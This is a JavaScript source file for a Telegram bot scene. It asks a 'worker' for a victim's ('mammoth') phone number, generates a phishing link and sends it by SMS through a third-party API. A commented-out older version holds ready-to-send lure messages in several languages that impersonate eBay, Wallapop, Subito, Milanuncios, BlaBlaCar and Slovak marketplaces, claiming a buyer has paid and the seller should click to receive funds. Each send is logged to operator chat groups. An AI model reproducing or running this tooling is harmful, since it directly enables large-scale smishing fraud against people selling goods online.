const { Scenes } = require('telegraf')
const request = require('request-promise')

const generateSMS = require('../other/generateSMS')
const generateLink = require('../other/generateLink')

const bbc = require('../../database/models/bbc')
const receive = require('../../database/models/receive')

const available = [
    /* de */
    '🇩🇪 Quoka 2.0',
    '🇩🇪 DHL 2.0',
    '🇩🇪 Ebay 2.0',
    '🇩🇪 Vinted 2.0',
    '🇩🇪 BlaBlaCar 1.0',
    '🇩🇪 BlaBlaCar 2.0',

    /* pl */
    '🇵🇱 OLX 2.0',
    '🇵🇱 InPost 2.0',
    '🇵🇱 Vinted 2.0',

    /* ro */
    '🇷🇴 OLX 2.0',
    '🇷🇴 FanCourier 2.0',
    '🇷🇴 BlaBlaCar 1.0',
    '🇷🇴 BlaBlaCar 2.0',

    /* es */
    '🇪🇸 Milanuncios 1.0',
    '🇪🇸 Milanuncios 2.0',
    '🇪🇸 Wallapop 1.0',
    '🇪🇸 Wallapop 2.0',
    '🇪🇸 Correos 2.0',
    '🇪🇸 BlaBlaCar 1.0',
    '🇪🇸 BlaBlaCar 2.0',
    '🇪🇸 Vinted 2.0',

    /* it */
    '🇮🇹 Subito 1.0',
    '🇮🇹 Subito 2.0',
    '🇮🇹 Wallapop 1.0',
    '🇮🇹 Wallapop 2.0',
    '🇮🇹 Kijiji 2.0',
    '🇮🇹 BlaBlaCar 1.0',
    '🇮🇹 BlaBlaCar 2.0',

    /* fr */
    '🇫🇷 BlaBlaCar 1.0',
    '🇫🇷 BlaBlaCar 2.0',
    '🇫🇷 Wallapop 1.0',
    '🇫🇷 Wallapop 2.0',

    /* pt */
    '🇵🇹 OLX 2.0',
    '🇵🇹 CTT 2.0',
    '🇵🇹 MBWAY 2.0',
    '🇵🇹 UBER 2.0',
    '🇵🇹 BlaBlaCar 1.0',
    '🇵🇹 BlaBlaCar 2.0',
    '🇵🇹 Vinted 2.0',

    /* au */
    '🇦🇺 Gumtree 2.0',

    /* uk */
    '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Gumtree 2.0',
    '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Wallapop 2.0',
    '🇬🇧 Wallapop 1.0'
]

const smsScenes = new Scenes.WizardScene('sms', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        ctx.wizard.state.data.id = ctx.callbackQuery.data.split(' ')[1]
        let res = await bbc.findOne({ link: ctx.wizard.state.data.id }).lean()
        if (!res) res = await receive.findOne({ link: ctx.wizard.state.data.id }).lean()

        ctx.wizard.state.data.service = res.service

        if (ctx.wizard.state.data.service.includes('🇩🇪')) {
            ctx.wizard.state.data.code = 'DE'
        } else if (ctx.wizard.state.data.service.includes('🇵🇱')) {
            ctx.wizard.state.data.code = 'PL'
        } else if (ctx.wizard.state.data.service.includes('🇷🇴')) {
            ctx.wizard.state.data.code = 'RO'
        } else if (ctx.wizard.state.data.service.includes('🇪🇸')) {
            ctx.wizard.state.data.code = 'ES'
        } else if (ctx.wizard.state.data.service.includes('🇮🇹')) {
            ctx.wizard.state.data.code = 'IT'
        } else if (ctx.wizard.state.data.service.includes('🇫🇷')) {
            ctx.wizard.state.data.code = 'FR'
        } else if (ctx.wizard.state.data.service.includes('🇵🇹')) {
            ctx.wizard.state.data.code = 'PT'
        } else if (ctx.wizard.state.data.service.includes('🇦🇺')) {
            ctx.wizard.state.data.code = 'AU'
        } else if (ctx.wizard.state.data.service.includes('🏴󠁧󠁢󠁥󠁮󠁧󠁿')) {
            ctx.wizard.state.data.code = 'UK'
        } else if (ctx.wizard.state.data.service.includes('🇬🇧')) {
            ctx.wizard.state.data.code = 'UK'
        }

        if (ctx.wizard.state.data.service.includes('BlaBlaCar')) {
            ctx.wizard.state.data.selection = 'BlaBlaCar'
        } else {
            ctx.wizard.state.data.selection = 'Default'
        }

        if (available.includes(ctx.wizard.state.data.service)) {
            await ctx.replyWithHTML(`<b>📲 Введите номер телефона мамонта</b>\n<b>❕ Обязательно:</b> <code>Без +, без пробелов. Иначе не отправится.</code>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⬅️ Отмена', callback_data: 'nazad' }]
                    ]
                }
            })

            await generateLink(ctx.wizard.state.data.service, ctx.wizard.state.data.id, ctx.from.id).then(async (value) => {
                ctx.wizard.state.data.link = value
            })

            return ctx.wizard.next()
        } else {
            await ctx.replyWithHTML('📲 Сервис, на который вы хотите отправить смс - временно недоступен', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⬅️ Назад', callback_data: '⬅️ Назад' }]
                    ]
                }
            })

            return ctx.scene.leave()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.phone = ctx.message.text
        console.log(`phone => ${ctx.wizard.state.data.phone}`)
        
        await request(`https://your-sms-service.com/api/?key=hallosetjdhgjn4jkv8777&t=3&shurl=${ctx.wizard.state.data.link}&number=${ctx.wizard.state.data.phone}`).then(async (body) => {
            ctx.wizard.state.data.link = body
            console.log(`link => ${ctx.wizard.state.data.link}`)

            let text = generateSMS(ctx.wizard.state.data.code, ctx.wizard.state.data.service.split(' ')[2], ctx.wizard.state.data.selection, ctx.wizard.state.data.link)
            console.log(`text => ${text}`)

            await request(`https://your-sms-service.com/api/?key=hallosetjdhgjn4jkv8777&t=1&number=${ctx.wizard.state.data.phone}&text=${text}`).then(async (res) => {
                if (res) {
                    console.log(res)
                    await bbc.findOneAndUpdate({ link: ctx.wizard.state.data.id }, { $set: { sms: 'yes' } }).lean()
                    await receive.findOneAndUpdate({ link: ctx.wizard.state.data.id }, { $set: { sms: 'yes' } }).lean() 
                    await ctx.replyWithHTML('📲 СМС было успешно отправлено!')
                } else {
                    await ctx.replyWithHTML('📲 Ошибка при отправке СМС!')
                }
            })
        })

        return ctx.scene.leave()
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
})

/* const available = [
    '🇩🇪 Ebay 2.0',

    '🇮🇹 Wallapop 2.0',
    '🇮🇹 Kijiji 2.0',
    '🇮🇹 Subito 2.0',

    '🇪🇸 Milanuncios 1.0',
    '🇪🇸 Milanuncios 2.0',
    '🇪🇸 Wallapop 1.0',
    '🇪🇸 Wallapop 2.0',

    '🇸🇰 BAZAR.SK 2.0',
    '🇸🇰 POSTA.SK 2.0',

    '🇮🇹 BlaBlaCar 1.0',
    '🇮🇹 BlaBlaCar 2.0',

    '🇪🇸 BlaBlaCar 1.0',
    '🇪🇸 BlaBlaCar 2.0',

    '🇫🇷 BlaBlaCar 1.0',
    '🇫🇷 BlaBlaCar 2.0',

    '🇩🇪 BlaBlaCar 1.0',
    '🇩🇪 BlaBlaCar 2.0'
]

const smsScenes = new Scenes.WizardScene('sms', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        ctx.wizard.state.data.id = ctx.callbackQuery.data.split(' ')[1]
        let res = await bbc.findOne({ link: ctx.wizard.state.data.id }).lean()
        if (!res) res = await receive.findOne({ link: ctx.wizard.state.data.id }).lean()

        if (res) {
            if (available.includes(res.service)) {
                ctx.wizard.state.data.service = res.service
                await ctx.replyWithHTML(`<b>📲 Введите номер телефона мамонта</b>\n<b>❕ Обязательно:</b> <code>С +, без пробелов. Иначе не отправится.</code>`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '⬅️ Отмена', callback_data: 'nazad' }]
                        ]
                    }
                })

                let data = await account.findOne({ tgID: ctx.from.id }).lean()
                let pro = (data.status == 'ПРО Воркер') ? 'yes' : 'no'
                let domain = await domains.findOne({ active: 'yes', pro: pro }).lean()
                ctx.wizard.state.data.link = `https://sms.${domain.domain}/receive/order/${ctx.wizard.state.data.id}`
                

                return ctx.wizard.next()
            } else {
                await ctx.replyWithHTML('📲 Сервис, на который вы хотите отправить смс - временно недоступен', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '⬅️ Назад', callback_data: '⬅️ Назад' }]
                        ]
                    }
                })

                return ctx.scene.leave()
            }
        } else {
            await ctx.replyWithHTML('📲 Сервис, на который вы хотите отправить смс - временно недоступен', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⬅️ Назад', callback_data: '⬅️ Назад' }]
                    ]
                }
            })

            return ctx.scene.leave()
        }
    } catch (e) {
        console.log(e)
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == 'Назад') {
            await ctx.reply(`Вернитесь в меню`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⬅️ Назад', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
            
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.phone = ctx.message.text

            let keyboard = []

            let templates = ''
            if (ctx.wizard.state.data.service == '🇩🇪 Ebay 2.0') {
                templates = `#5 🇩🇪 (2.0) Ein Benutzer hat Ihr Produkt gekauft! Zum Bestätigen anklicken: $LINK$. Ein Kurier wird Sie kontaktieren, sobald das Geld eingegangen ist.`
                keyboard.push(new Array({ text: '5' }))
            } else if (ctx.wizard.state.data.service == '🇮🇹 Wallapop 2.0') {
                templates = `#1 🇮🇹 (2.0) Un utente ha comprato il tuo prodotto con Wallapop Envios! Ricevi i tuoi fondi: www.$link$ (un corriere ti contattera dopo la ricezione)`
                keyboard.push(new Array({ text: '1' }))
            } else if (ctx.wizard.state.data.service == '🇮🇹 Kijiji 2.0') {
                templates = `#2 🇮🇹 (2.0) Un utente ha comprato il tuo prodotto. Ricevi il tuo denaro: www.$link$. Un corriere vi contattera dopo aver ricevuto i vostri soldi.`
                keyboard.push(new Array({ text: '2' }))
            } else if (ctx.wizard.state.data.service == '🇮🇹 Subito 2.0') {
                templates = `#3 🇮🇹 (2.0) Un utente ha comprato il tuo prodotto. Ricevi il tuo denaro: www.$link$. Un corriere vi contattera dopo aver ricevuto i vostri soldi.`
                keyboard.push(new Array({ text: '3' }))
            } else if (ctx.wizard.state.data.service == '🇪🇸 Milanuncios 1.0') {
                templates = `#2 🇪🇸 (1.0) Su pedido con Milanuncios Express se ha generado con exito. Vaya a confirmar y pagar su pedido: www.$link$`
                keyboard.push(new Array({ text: '2' }))
            } else if (ctx.wizard.state.data.service == '🇪🇸 Milanuncios 2.0') {
                templates = `#1 🇪🇸 (2.0) Un usuario compro su producto con Milanuncios Express! Reciba sus fondos: www.$link$ (un mensajero se pondra en contacto con usted tras la recepcion)`
                keyboard.push(new Array({ text: '1' }))
            } else if (ctx.wizard.state.data.service == '🇪🇸 Wallapop 1.0') {
                templates = `#2 🇪🇸 (1.0) Su pedido con Wallapop Envios se ha generado con exito. Vaya a confirmar y pagar su pedido: www.$link$`
                keyboard.push(new Array({ text: '2' }))
            } else if (ctx.wizard.state.data.service == '🇪🇸 Wallapop 2.0') {
                templates = `#1 🇪🇸 (2.0) Un usuario compro su producto con Wallapop Envios! Reciba sus fondos: www.$link$ (un mensajero se pondra en contacto con usted tras la recepcion)`
                keyboard.push(new Array({ text: '1' }))
            } else if (ctx.wizard.state.data.service == '🇸🇰 BAZAR.SK 2.0') {
                templates = `#3 🇸🇰 (2.0) Pouzivatel si kupil vas produkt. Ziskajte svoje peniaze: $link$. Po prijati penazi vas bude kontaktovat kurier.`
                keyboard.push(new Array({ text: '3' }))
            } else if (ctx.wizard.state.data.service == '🇸🇰 POSTA.SK 2.0') {
                templates = `#3 🇸🇰 (2.0) Pouzivatel si kupil vas produkt. Ziskajte svoje peniaze: $ link$. Po prijati penazi vas bude kontaktovat kurier.`
                keyboard.push(new Array({ text: '3' }))
            } else if ((ctx.wizard.state.data.service == '🇮🇹 BlaBlaCar 1.0') || (ctx.wizard.state.data.service == '🇮🇹 BlaBlaCar 2.0')) {
                templates = `#1 🇮🇹 (2.0) La tua corsa e prenotata da un utente. Ottieni i tuoi fondi per la prenotazione: $link$\n#2 🇮🇹 (1.0) Conferma la tua prenotazione entro 30 minuti! Vai al pagamento: $link$`
                keyboard.push(new Array({ text: '1' }, { text: '2' }))
            } else if ((ctx.wizard.state.data.service == '🇪🇸 BlaBlaCar 1.0') || (ctx.wizard.state.data.service == '🇪🇸 BlaBlaCar 2.0')) {
                templates = `#1 🇪🇸 (2.0) Tu viaje ha sido reservado por un usuario. Obtenga el valor de su dinero por su reserva: $link$\n#2 🇪🇸 (1.0) Confirma tu reserva en 30 minutos! Saltar al pago: $link$`
                keyboard.push(new Array({ text: '1' }, { text: '2' }))
            } else if ((ctx.wizard.state.data.service == '🇫🇷 BlaBlaCar 1.0') || (ctx.wizard.state.data.service == '🇫🇷 BlaBlaCar 2.0')) {
                templates = `#1 🇫🇷 (2.0) Votre trajet est réservé par un utilisateur. Recevoir les fonds pour votre réservation: $link$.\n#2 🇫🇷 (1.0) Confirmez votre réservation dans les 30 minutes! Procédez au paiement: $link$.`
                keyboard.push(new Array({ text: '1' }, { text: '2' }))
            } else if ((ctx.wizard.state.data.service == '🇩🇪 BlaBlaCar 1.0') || (ctx.wizard.state.data.service == '🇩🇪 BlaBlaCar 2.0')) {
                templates = `#1 🇩🇪 (2.0) Ihre Fahrt wird von einem Benutzer gebucht. Holen Sie sich Ihr Geld fuer die Reservierung: $link$\n#2 🇩🇪 (1.0) Bestaetigen Sie Ihre Reservierung innerhalb von 30 Minuten! Sprung zur Zahlung: $link$`
                keyboard.push(new Array({ text: '1' }, { text: '2' }))
            }

            keyboard.push(new Array({ text: 'Назад' }))

            await ctx.replyWithHTML(`📲 <b>Выберите номер шаблона, по которому отправить SMS</b>\n\n${templates}`, {
                reply_markup: {
                    resize_keyboard: true,
                    keyboard: keyboard
                }
            })

            return ctx.wizard.next()
        }
            
    } catch (e) {
        console.log(e)
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        if (ctx.message.text == 'Назад') {
            await ctx.reply(`Вернитесь в меню`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '⬅️ Назад', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
            
            return ctx.scene.leave()
        } else {
            ctx.wizard.state.data.template = ctx.message.text
            await ctx.replyWithHTML('<b>📲 Начинаем отправку...</b>')
            
            await bbc.findOneAndUpdate({ link: ctx.wizard.state.data.id }, { $set: { sms: "yes" } }, { new: true })
            await receive.findOneAndUpdate({ link: ctx.wizard.state.data.id }, { $set: { sms: "yes" } }, { new: true })
    
            await ctx.telegram.sendMessage(config.bot.sms_logs, `${ctx.wizard.state.data.service}\n👨‍🔧 Рабочий: @${ctx.from.username} | ${ctx.from.id}\n📲 Номер: ${ctx.wizard.state.data.phone}\n🔗 Ссылка: ${ctx.wizard.state.data.link}\n📬 Шаблон: #${ctx.wizard.state.data.template}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Отправил', callback_data: `sms_i_sent_sms ${ctx.wizard.state.data.id}` }]
                    ]
                }
            })

            await ctx.telegram.sendMessage(-1001799864076, `${ctx.wizard.state.data.service}\n👨‍🔧 Рабочий: @${ctx.from.username} | ${ctx.from.id}\n📲 Номер: ${ctx.wizard.state.data.phone}\n🔗 Ссылка: ${ctx.wizard.state.data.link}\n📬 Шаблон: #${ctx.wizard.state.data.template}`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Отправил', callback_data: `sms_i_sent_sms ${ctx.wizard.state.data.id}` }]
                    ]
                }
            })

            return ctx.scene.leave()
        }
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}) */

smsScenes.action('Отмена', async (ctx) => {
    await ctx.deleteMessage(ctx.update.callback_query.message.message_id)
    return await ctx.scene.leave()
})

module.exports = smsScenes